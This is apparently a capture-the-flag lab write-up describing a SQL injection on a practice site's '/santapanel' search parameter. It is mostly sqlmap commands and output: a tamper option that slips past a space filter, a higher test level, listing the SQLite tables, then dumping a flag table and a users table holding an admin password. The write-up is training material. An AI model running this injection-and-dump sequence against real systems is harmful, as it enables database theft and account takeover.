/s**tap***l
/santapanel



```console
$ sqlmap -r day5 --tamper=space2comment     
.
.

[07:46:20] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
```
let add --level=5
```console
$ sqlmap -r day5 --tamper=space2comment --level 5
.
.
[07:48:20] [INFO] testing 'Generic inline queries'
[07:48:20] [INFO] testing 'SQLite inline queries'
[07:48:20] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[07:48:20] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[07:48:21] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[07:48:41] [INFO] GET parameter 'search' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
```
yeah something is happening here :D, now just wait and wait for the scan is done.


the next goal is dump the database. SQLite is running as dbms, we dont need to run `sqlmap --dbs` since SQLite dont have databases, **only tables**.
```console
└─$ sqlmap -r day5 --tamper=space2comment --level 5 --threads 10 --tables 
.
.
Database: SQLite_masterdb
[3 tables]
+--------------+
| hidden_table |
| sequels      |
| users        |
+--------------+
```
`hidden_table` looks interesting, let dump it!
```console
$ sqlmap -r day5 --tamper=space2comment --level 5 --threads 10 -T 'hidden_table' --dump
.
.
.
[08:02:13] [INFO] fetching entries for table 'hidden_table' in database 'SQLite_masterdb'
Database: SQLite_masterdb
Table: hidden_table
[1 entry]
+-----------------------------------------+
| flag                                    |
+-----------------------------------------+
| thmfox{All____________________________} |
+-----------------------------------------+
```

to find admin password -> dump `users` table
```console
$ sqlmap -r day5 --tamper=space2comment --level 5 --threads 10 -T 'users' --dump
.
.
.
[08:05:24] [INFO] fetching entries for table 'users' in database 'SQLite_masterdb'
Database: SQLite_masterdb
Table: users
[1 entry]
+------------------+----------+
| password         | username |
+------------------+----------+
| EhCNSWzzFP6sc7gB | admin    |
+------------------+----------+
```